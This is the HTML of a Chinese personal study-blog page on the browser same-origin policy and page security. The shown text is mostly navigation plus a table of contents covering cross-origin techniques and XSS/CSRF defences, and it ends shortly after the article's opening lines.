<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>同源策略 | 弯弯个人小站</title>
    <meta name="description" content="万雯赟小站">
    <link rel="preload stylesheet" href="/assets/style.f3956863.css" as="style">
    <script type="module" src="/assets/app.f6feaffc.js"></script>
    <link rel="preload" href="/assets/inter-roman-latin.2ed14f66.woff2" as="font" type="font/woff2" crossorigin="">
  <link rel="modulepreload" href="/assets/chunks/framework.75331a37.js">
  <link rel="modulepreload" href="/assets/chunks/theme.f5b3571a.js">
  <link rel="modulepreload" href="/assets/浏览器_安全-页面安全(跨域，网站攻击).md.d24b59e6.lean.js">
  <script id="check-dark-light">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-bfa41ecf><!--[--><!--]--><!--[--><span tabindex="-1" data-v-b069d557></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-b069d557> Skip to content </a><!--]--><!----><header class="VPNav" data-v-bfa41ecf data-v-ce4dd6ed><div class="VPNavBar has-sidebar" data-v-ce4dd6ed data-v-e0a83f5e><div class="container" data-v-e0a83f5e><div class="title" data-v-e0a83f5e><div class="VPNavBarTitle has-sidebar" data-v-e0a83f5e data-v-6db94822><a class="title" href="/" data-v-6db94822><!--[--><!--]--><!--[--><img class="VPImage logo" src="/images/logo.png" alt data-v-50a2d2d2><!--]--><!--[-->弯弯个人小站<!--]--><!--[--><!--]--></a></div></div><div class="content" data-v-e0a83f5e><div class="curtain" data-v-e0a83f5e></div><div class="content-body" data-v-e0a83f5e><!--[--><!--]--><div class="VPNavBarSearch search" data-v-e0a83f5e><!----><div id="docsearch"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"><span class="DocSearch-Button-Key">Meta</span><span class="DocSearch-Button-Key">K</span></span></button></div></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-e0a83f5e data-v-78a868e4><span id="main-nav-aria-label" class="visually-hidden" data-v-78a868e4>Main Navigation</span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/guide.html" tabindex="0" data-v-78a868e4 data-v-e8bd2df7 data-v-ff5dff0d><!--[-->个人简历<!--]--><!----></a><!--]--><!--[--><div class="VPFlyout VPNavBarMenuGroup" data-v-78a868e4 data-v-a790c836><button type="button" class="button" aria-haspopup="true" aria-expanded="false" data-v-a790c836><span class="text" data-v-a790c836><!----> 学习小记 <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewbox="0 0 24 24" class="text-icon" data-v-a790c836><path d="M12,16c-0.3,0-0.5-0.1-0.7-0.3l-6-6c-0.4-0.4-0.4-1,0-1.4s1-0.4,1.4,0l5.3,5.3l5.3-5.3c0.4-0.4,1-0.4,1.4,0s0.4,1,0,1.4l-6,6C12.5,15.9,12.3,16,12,16z"></path></svg></span></button><div class="menu" data-v-a790c836><div class="VPMenu" data-v-a790c836 data-v-93cba166><div class="items" data-v-93cba166><!--[--><!--[--><div class="VPMenuLink" data-v-93cba166 data-v-75354fd2><a class="VPLink link" href="/JavaScript%E5%9F%BA%E7%A1%80/js%E5%8E%9F%E5%9E%8B(%E5%8E%9F%E5%9E%8B%E9%93%BE)%E3%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F%E3%80%81this%E3%80%81%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E3%80%81%E9%97%AD%E5%8C%85.html" data-v-75354fd2 data-v-ff5dff0d><!--[-->JS基础<!--]--><!----></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-93cba166 data-v-75354fd2><a class="VPLink link" href="/Google%20V8/V8(1)%20-%20%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87%EF%BC%8C%E4%BD%9C%E7%94%A8%E5%9F%9F%E3%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E3%80%81%E9%97%AD%E5%8C%85%E3%80%81%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8CJS%E4%BB%A3%E7%A0%81.html" data-v-75354fd2 data-v-ff5dff0d><!--[-->Google V8<!--]--><!----></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-93cba166 data-v-75354fd2><a class="VPLink link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AE%8F%E8%A7%82(1)-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84%E3%80%81%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E5%B1%95%E7%A4%BA.html" data-v-75354fd2 data-v-ff5dff0d><!--[-->浏览器<!--]--><!----></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-93cba166 data-v-75354fd2><a class="VPLink link" href="/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/React/React%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/React%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%861-%E7%90%86%E5%BF%B5(React15%E3%80%81fiber%E6%9E%B6%E6%9E%84).html" data-v-75354fd2 data-v-ff5dff0d><!--[-->前端框架<!--]--><!----></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-93cba166 data-v-75354fd2><a class="VPLink link" href="/%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/120.%E4%B8%89%E8%A7%92%E5%BD%A2%E6%9C%80%E5%B0%8F%E8%B7%AF%E5%BE%84%E5%92%8C.html" data-v-75354fd2 data-v-ff5dff0d><!--[-->LC刷题笔记<!--]--><!----></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-93cba166 data-v-75354fd2><a class="VPLink link" href="/%E5%B7%A5%E7%A8%8B%E5%8C%96/Webpack-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" data-v-75354fd2 data-v-ff5dff0d><!--[-->工程化<!--]--><!----></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-93cba166 data-v-75354fd2><a class="VPLink link" href="/%E5%85%B6%E4%BB%96/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B7%A8%E5%9F%9F%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E3%80%81%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83.html" data-v-75354fd2 data-v-ff5dff0d><!--[-->其他<!--]--><!----></a></div><!--]--><!--]--></div><!--[--><!--]--></div></div></div><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/team.html" tabindex="0" data-v-78a868e4 data-v-e8bd2df7 data-v-ff5dff0d><!--[-->团队成员<!--]--><!----></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-e0a83f5e data-v-0a9060d7><label title="toggle dark mode" data-v-0a9060d7 data-v-ead9ca26><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" aria-checked="false" data-v-ead9ca26 data-v-5f23a591><span class="check" data-v-5f23a591><span class="icon" data-v-5f23a591><!--[--><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewbox="0 0 24 24" class="sun" data-v-ead9ca26><path d="M12,18c-3.3,0-6-2.7-6-6s2.7-6,6-6s6,2.7,6,6S15.3,18,12,18zM12,8c-2.2,0-4,1.8-4,4c0,2.2,1.8,4,4,4c2.2,0,4-1.8,4-4C16,9.8,14.2,8,12,8z"></path><path d="M12,4c-0.6,0-1-0.4-1-1V1c0-0.6,0.4-1,1-1s1,0.4,1,1v2C13,3.6,12.6,4,12,4z"></path><path d="M12,24c-0.6,0-1-0.4-1-1v-2c0-0.6,0.4-1,1-1s1,0.4,1,1v2C13,23.6,12.6,24,12,24z"></path><path d="M5.6,6.6c-0.3,0-0.5-0.1-0.7-0.3L3.5,4.9c-0.4-0.4-0.4-1,0-1.4s1-0.4,1.4,0l1.4,1.4c0.4,0.4,0.4,1,0,1.4C6.2,6.5,5.9,6.6,5.6,6.6z"></path><path d="M19.8,20.8c-0.3,0-0.5-0.1-0.7-0.3l-1.4-1.4c-0.4-0.4-0.4-1,0-1.4s1-0.4,1.4,0l1.4,1.4c0.4,0.4,0.4,1,0,1.4C20.3,20.7,20,20.8,19.8,20.8z"></path><path d="M3,13H1c-0.6,0-1-0.4-1-1s0.4-1,1-1h2c0.6,0,1,0.4,1,1S3.6,13,3,13z"></path><path d="M23,13h-2c-0.6,0-1-0.4-1-1s0.4-1,1-1h2c0.6,0,1,0.4,1,1S23.6,13,23,13z"></path><path d="M4.2,20.8c-0.3,0-0.5-0.1-0.7-0.3c-0.4-0.4-0.4-1,0-1.4l1.4-1.4c0.4-0.4,1-0.4,1.4,0s0.4,1,0,1.4l-1.4,1.4C4.7,20.7,4.5,20.8,4.2,20.8z"></path><path d="M18.4,6.6c-0.3,0-0.5-0.1-0.7-0.3c-0.4-0.4-0.4-1,0-1.4l1.4-1.4c0.4-0.4,1-0.4,1.4,0s0.4,1,0,1.4l-1.4,1.4C18.9,6.5,18.6,6.6,18.4,6.6z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewbox="0 0 24 24" class="moon" data-v-ead9ca26><path d="M12.1,22c-0.3,0-0.6,0-0.9,0c-5.5-0.5-9.5-5.4-9-10.9c0.4-4.8,4.2-8.6,9-9c0.4,0,0.8,0.2,1,0.5c0.2,0.3,0.2,0.8-0.1,1.1c-2,2.7-1.4,6.4,1.3,8.4c2.1,1.6,5,1.6,7.1,0c0.3-0.2,0.7-0.3,1.1-0.1c0.3,0.2,0.5,0.6,0.5,1c-0.2,2.7-1.5,5.1-3.6,6.8C16.6,21.2,14.4,22,12.1,22zM9.3,4.4c-2.9,1-5,3.6-5.2,6.8c-0.4,4.4,2.8,8.3,7.2,8.7c2.1,0.2,4.2-0.4,5.8-1.8c1.1-0.9,1.9-2.1,2.4-3.4c-2.5,0.9-5.3,0.5-7.5-1.1C9.2,11.4,8.1,7.7,9.3,4.4z"></path></svg><!--]--></span></span></button></label></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-e0a83f5e data-v-19286bcf data-v-271a8be0><!--[--><a class="VPSocialLink" href="https://github.com/wanwenyun/" aria-label="github" target="_blank" rel="noopener" data-v-271a8be0 data-v-9cb407ff><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-e0a83f5e data-v-f52ffdfb data-v-a790c836><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-a790c836><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewbox="0 0 24 24" class="icon" data-v-a790c836><circle cx="12" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle><circle cx="5" cy="12" r="2"></circle></svg></button><div class="menu" data-v-a790c836><div class="VPMenu" data-v-a790c836 data-v-93cba166><!----><!--[--><!--[--><!----><div class="group" data-v-f52ffdfb><div class="item appearance" data-v-f52ffdfb><p class="label" data-v-f52ffdfb>Appearance</p><div class="appearance-action" data-v-f52ffdfb><label title="toggle dark mode" data-v-f52ffdfb data-v-ead9ca26><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" aria-checked="false" data-v-ead9ca26 data-v-5f23a591><span class="check" data-v-5f23a591><span class="icon" data-v-5f23a591><!--[--><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewbox="0 0 24 24" class="sun" data-v-ead9ca26><path d="M12,18c-3.3,0-6-2.7-6-6s2.7-6,6-6s6,2.7,6,6S15.3,18,12,18zM12,8c-2.2,0-4,1.8-4,4c0,2.2,1.8,4,4,4c2.2,0,4-1.8,4-4C16,9.8,14.2,8,12,8z"></path><path d="M12,4c-0.6,0-1-0.4-1-1V1c0-0.6,0.4-1,1-1s1,0.4,1,1v2C13,3.6,12.6,4,12,4z"></path><path d="M12,24c-0.6,0-1-0.4-1-1v-2c0-0.6,0.4-1,1-1s1,0.4,1,1v2C13,23.6,12.6,24,12,24z"></path><path d="M5.6,6.6c-0.3,0-0.5-0.1-0.7-0.3L3.5,4.9c-0.4-0.4-0.4-1,0-1.4s1-0.4,1.4,0l1.4,1.4c0.4,0.4,0.4,1,0,1.4C6.2,6.5,5.9,6.6,5.6,6.6z"></path><path d="M19.8,20.8c-0.3,0-0.5-0.1-0.7-0.3l-1.4-1.4c-0.4-0.4-0.4-1,0-1.4s1-0.4,1.4,0l1.4,1.4c0.4,0.4,0.4,1,0,1.4C20.3,20.7,20,20.8,19.8,20.8z"></path><path d="M3,13H1c-0.6,0-1-0.4-1-1s0.4-1,1-1h2c0.6,0,1,0.4,1,1S3.6,13,3,13z"></path><path d="M23,13h-2c-0.6,0-1-0.4-1-1s0.4-1,1-1h2c0.6,0,1,0.4,1,1S23.6,13,23,13z"></path><path d="M4.2,20.8c-0.3,0-0.5-0.1-0.7-0.3c-0.4-0.4-0.4-1,0-1.4l1.4-1.4c0.4-0.4,1-0.4,1.4,0s0.4,1,0,1.4l-1.4,1.4C4.7,20.7,4.5,20.8,4.2,20.8z"></path><path d="M18.4,6.6c-0.3,0-0.5-0.1-0.7-0.3c-0.4-0.4-0.4-1,0-1.4l1.4-1.4c0.4-0.4,1-0.4,1.4,0s0.4,1,0,1.4l-1.4,1.4C18.9,6.5,18.6,6.6,18.4,6.6z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewbox="0 0 24 24" class="moon" data-v-ead9ca26><path d="M12.1,22c-0.3,0-0.6,0-0.9,0c-5.5-0.5-9.5-5.4-9-10.9c0.4-4.8,4.2-8.6,9-9c0.4,0,0.8,0.2,1,0.5c0.2,0.3,0.2,0.8-0.1,1.1c-2,2.7-1.4,6.4,1.3,8.4c2.1,1.6,5,1.6,7.1,0c0.3-0.2,0.7-0.3,1.1-0.1c0.3,0.2,0.5,0.6,0.5,1c-0.2,2.7-1.5,5.1-3.6,6.8C16.6,21.2,14.4,22,12.1,22zM9.3,4.4c-2.9,1-5,3.6-5.2,6.8c-0.4,4.4,2.8,8.3,7.2,8.7c2.1,0.2,4.2-0.4,5.8-1.8c1.1-0.9,1.9-2.1,2.4-3.4c-2.5,0.9-5.3,0.5-7.5-1.1C9.2,11.4,8.1,7.7,9.3,4.4z"></path></svg><!--]--></span></span></button></label></div></div></div><div class="group" data-v-f52ffdfb><div class="item social-links" data-v-f52ffdfb><div class="VPSocialLinks social-links-list" data-v-f52ffdfb data-v-271a8be0><!--[--><a class="VPSocialLink" href="https://github.com/wanwenyun/" aria-label="github" target="_blank" rel="noopener" data-v-271a8be0 data-v-9cb407ff><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-e0a83f5e data-v-45983cb0><span class="container" data-v-45983cb0><span class="top" data-v-45983cb0></span><span class="middle" data-v-45983cb0></span><span class="bottom" data-v-45983cb0></span></span></button></div></div></div></div><!----></header><div class="VPLocalNav" data-v-bfa41ecf data-v-068d0702><button class="menu" aria-expanded="false" aria-controls="VPSidebarNav" data-v-068d0702><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewbox="0 0 24 24" class="menu-icon" data-v-068d0702><path d="M17,11H3c-0.6,0-1-0.4-1-1s0.4-1,1-1h14c0.6,0,1,0.4,1,1S17.6,11,17,11z"></path><path d="M21,7H3C2.4,7,2,6.6,2,6s0.4-1,1-1h18c0.6,0,1,0.4,1,1S21.6,7,21,7z"></path><path d="M21,15H3c-0.6,0-1-0.4-1-1s0.4-1,1-1h18c0.6,0,1,0.4,1,1S21.6,15,21,15z"></path><path d="M17,19H3c-0.6,0-1-0.4-1-1s0.4-1,1-1h14c0.6,0,1,0.4,1,1S17.6,19,17,19z"></path></svg><span class="menu-text" data-v-068d0702>Menu</span></button><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-068d0702 data-v-0cf67212><button data-v-0cf67212>Return to top</button><!----></div></div><aside class="VPSidebar" data-v-bfa41ecf data-v-dc775a50><div class="curtain" data-v-dc775a50></div><nav class="nav" id="VPSidebarNav" aria-labelledby="sidebar-aria-label" tabindex="-1" data-v-dc775a50><span class="visually-hidden" id="sidebar-aria-label" data-v-dc775a50> Sidebar Navigation </span><!--[--><!--]--><!--[--><div class="group" data-v-dc775a50><section class="VPSidebarItem level-0 has-active" data-v-dc775a50 data-v-276d3b5d><!----><div class="items" data-v-276d3b5d><!--[--><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/web%20API-XMLHttpRequest%EF%BC%8C%E5%8F%8Aajax,axios,fetch%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>web API-XMLHttpRequest，及ajax,axios,fetch之间的区别</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AD%98%E5%82%A8-cookie%E3%80%81localStorage%E3%80%81sessionStorage%E3%80%81%E7%99%BB%E9%99%86%E4%BF%9D%E6%8C%81.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>存储-cookie、localStorage、sessionStorage、登陆保持</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AE%89%E5%85%A8-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8(%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%EF%BC%8C%E7%AB%99%E7%82%B9%E9%9A%94%E7%A6%BB)%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8(https).html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>安全-系统安全(安全沙箱，站点隔离)、网络安全(https)</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link is-active has-active" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AE%89%E5%85%A8-%E9%A1%B5%E9%9D%A2%E5%AE%89%E5%85%A8(%E8%B7%A8%E5%9F%9F%EF%BC%8C%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB).html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>安全-页面安全(跨域，网站攻击)</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AE%8F%E8%A7%82(1)-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84%E3%80%81%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E5%B1%95%E7%A4%BA.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>宏观(1)-多进程架构、从输入URL到展示</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AE%8F%E8%A7%82(2)-%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>宏观(2)-渲染流程</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E7%BC%93%E5%AD%98-DNS%E3%80%81CDN.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>缓存-DNS、CDN</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E7%BC%93%E5%AD%98-%E6%B5%8F%E8%A7%88%E5%99%A8(http)%E7%BC%93%E5%AD%98(%E5%BC%BA%E7%BC%93%E5%AD%98%EF%BC%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98).html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>缓存-浏览器(http)缓存(强缓存，协商缓存)</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E7%BD%91%E7%BB%9C(1)-TCP%E5%8D%8F%E8%AE%AE%EF%BC%8CDNS%E8%A7%A3%E6%9E%90(%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90).html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>网络(1)-TCP协议，DNS解析(域名解析)</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E7%BD%91%E7%BB%9C(2)-http1%E3%80%812%E3%80%813.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>网络(2)-http1、2、3</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E7%BD%91%E7%BB%9C(3)-https.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>网络(3)-https</p><!--]--><!----></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-276d3b5d data-v-276d3b5d><div class="item" data-v-276d3b5d><div class="indicator" data-v-276d3b5d></div><a class="VPLink link link" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E7%BD%91%E7%BB%9C(4)-http%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.html" data-v-276d3b5d data-v-ff5dff0d><!--[--><p class="text" data-v-276d3b5d>网络(4)-http协议相关知识</p><!--]--><!----></a><!----></div><!----></div><!--]--></div></section></div><!--]--><!--[--><!--]--></nav></aside><div class="VPContent has-sidebar" id="VPContent" data-v-bfa41ecf data-v-05329f80><div class="VPDoc has-sidebar has-aside" data-v-05329f80 data-v-4dd2ec74><!--[--><!--]--><div class="container" data-v-4dd2ec74><div class="aside" data-v-4dd2ec74><div class="aside-curtain" data-v-4dd2ec74></div><div class="aside-container" data-v-4dd2ec74><div class="aside-content" data-v-4dd2ec74><div class="VPDocAside" data-v-4dd2ec74 data-v-29876e63><!--[--><!--]--><!--[--><!--]--><div class="VPDocAsideOutline" data-v-29876e63 data-v-05f89462><div class="content" data-v-05f89462><div class="outline-marker" data-v-05f89462></div><div class="outline-title" data-v-05f89462>当前页</div><nav aria-labelledby="doc-outline-aria-label" data-v-05f89462><span class="visually-hidden" id="doc-outline-aria-label" data-v-05f89462> Table of Contents for current page </span><ul class="root" data-v-05f89462 data-v-140cead5><!--[--><!--]--></ul></nav></div></div><!--[--><!--]--><div class="spacer" data-v-29876e63></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-4dd2ec74><div class="content-container" data-v-4dd2ec74><!--[--><!--]--><!----><main class="main" data-v-4dd2ec74><div style="position:relative;" class="vp-doc _%E6%B5%8F%E8%A7%88%E5%99%A8_%E5%AE%89%E5%85%A8-%E9%A1%B5%E9%9D%A2%E5%AE%89%E5%85%A8(%E8%B7%A8%E5%9F%9F%EF%BC%8C%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB)" data-v-4dd2ec74><div><ul><li><a href="#同源策略">同源策略</a><ul><li><a href="#什么是同源策略">什么是同源策略</a></li><li><a href="#同源策略对dom层面数据层面网络层面的影响----跨域问题">同源策略对DOM层面、数据层面、网络层面的影响 -- 跨域问题</a></li></ul></li><li><a href="#如何解决跨域问题">如何解决跨域问题</a><ul><li><a href="#cors---跨域资源共享">CORS - 跨域资源共享</a><ul><li><a href="#简单请求">简单请求</a></li><li><a href="#非简单请求">非简单请求</a></li><li><a href="#总结">总结</a></li><li><a href="#为什么cors要有预检请求呢">为什么CORS要有预检请求呢？</a></li></ul></li><li><a href="#页面中可以嵌入第三方资源---jsonp">页面中可以嵌入第三方资源 - JSONP</a></li><li><a href="#postmessage跨域">postMessage跨域</a></li><li><a href="#服务器代理">服务器代理</a></li></ul></li><li><a href="#实际开发中如何解决跨域">实际开发中如何解决跨域？</a></li><li><a href="#网站攻击及如何防范">网站攻击及如何防范</a><ul><li><a href="#xss攻击">XSS攻击</a><ul><li><a href="#什么是xss攻击">什么是XSS攻击</a><ul><li><a href="#存储型xss攻击">存储型XSS攻击</a></li><li><a href="#反射型-xss-攻击">反射型 XSS 攻击</a></li><li><a href="#基于-dom-的-xss-攻击">基于 DOM 的 XSS 攻击</a></li></ul></li><li><a href="#如何防范xss攻击-csphttponly">如何防范XSS攻击? CSP、HttpOnly、</a></li></ul></li><li><a href="#csrf攻击">CSRF攻击</a><ul><li><a href="#如何防止csrf攻击samesite等">如何防止CSRF攻击？SameSite等</a></li></ul></li></ul></li></ul><p>浏览器安全可以分为三大块——<strong>Web 页面安全、浏览器网络安全和浏览器系统安全</strong></p><p>本文先讲<strong>页面安全</strong></p><h1 id="同源策略" tabindex="-1">同源策略 <a class="header-anchor" href="#同源策略" aria-label="Permalink to &quot;同源策略&quot;">​</a></h1><blockquote><p><a 